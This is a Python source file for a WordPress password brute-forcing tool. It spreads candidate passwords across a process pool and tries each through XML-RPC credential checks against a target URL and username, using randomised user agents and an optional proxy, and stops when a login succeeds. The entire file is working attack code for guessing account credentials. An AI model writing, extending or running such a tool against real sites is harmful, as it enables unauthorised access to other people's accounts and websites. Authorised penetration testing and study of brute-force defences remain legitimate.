import pathos.multiprocessing as multiprocessing
import multiprocessing as standard_multiprocessing
from xmlrpc import Xmlrpc as WP
from time import time
from view import View
from config import USER_AGENTS
from config import COUNTER_NOTIFY
from random import choice as random_item
from functools import partial
from utils import Utils

# counter for passwords checked
START_TIME = time()

class Bruteforcer:
    def __init__(self, args, passwords):
        self._args = args
        self._passwords = passwords
        self._args['user-agent'] = random_item(USER_AGENTS)

        self._pool = multiprocessing.Pool(self._args['threads'])    # specific number of thread
        self._pool_manager = standard_multiprocessing.Manager()
        self._pool_manager_dict = self._pool_manager.dict()
        self._pool_manager_dict['stopped'] = False
        self._pool_manager_dict['counter'] = 0

    # init the bruteforce
    def start(self):
        t = START_TIME
        # use partial in order to pass more than 1 value to pool.map
        try:
            func = partial(Bruteforcer.check_password, self._args, self._pool_manager_dict)
            self._pool.map(func, self._passwords)    # init
            self._pool.close()  # close the pool

            self._pool.join()   # wait for threads to finish
            elapsed = time() - t

            t_p = Utils.time_parser(elapsed)    # time parsed

            password = self._pool_manager_dict['password']
            if password:
                # password found
                View.found_password(password)
            else:
                View.warning('Password not found')
            View.normal('Time elapsed: {}'.format(t_p))

            View.new_line()
        # CTRL+C pressed
        except KeyboardInterrupt:
            View.ctrl_c_pressed()
            self._pool_manager_dict['stopped'] = True

            self._pool.terminate()
            self._pool.join()


    # method called by pool thread
    @staticmethod
    def check_password(args, pool_dict, password):
        # check if password was found
        if pool_dict['stopped']:
            return  # if so, return

        # check credentials
        try:
            wp = WP(args['target_url'], args['username'], password, args['user-agent'], args['proxy'], args['timeout'])
            result = wp.check_credentials()
            status_code = result[0]
            resp_length = result[1]
            found = result[2]

            # check if verbose, and password not found
            # to print some details about the request
            if args['verbose'] and not pool_dict['stopped']:
                View.password(password, status_code, resp_length)

            if found:
                # password was found !
                pool_dict['password'] = password
                pool_dict['stopped'] = True
                return

            pool_dict['counter'] += 1  # increment counter
            c_v = pool_dict['counter']  # get it's value
            t_v = time() - START_TIME  # get time value, since start time
            t_p = Utils.time_parser(t_v)  # parse value, to get minutes or seconds
            if c_v % COUNTER_NOTIFY == 0 and not pool_dict['stopped']:
                View.new_line()
                View.normal('Checked {} passwords in {}'.format(c_v, t_p))
                View.new_line()

        except Exception, ex:
            View.error(str(ex))
            pool_dict['stopped'] = True # stop it
            return
        except KeyboardInterrupt:
            # still shows the CTRL+C message two times
            # instead of one. Even if separate Lock and RawValue is used
            # best for now though
            if not pool_dict['stopped']:
                View.ctrl_c_pressed()
                pool_dict['stopped'] = True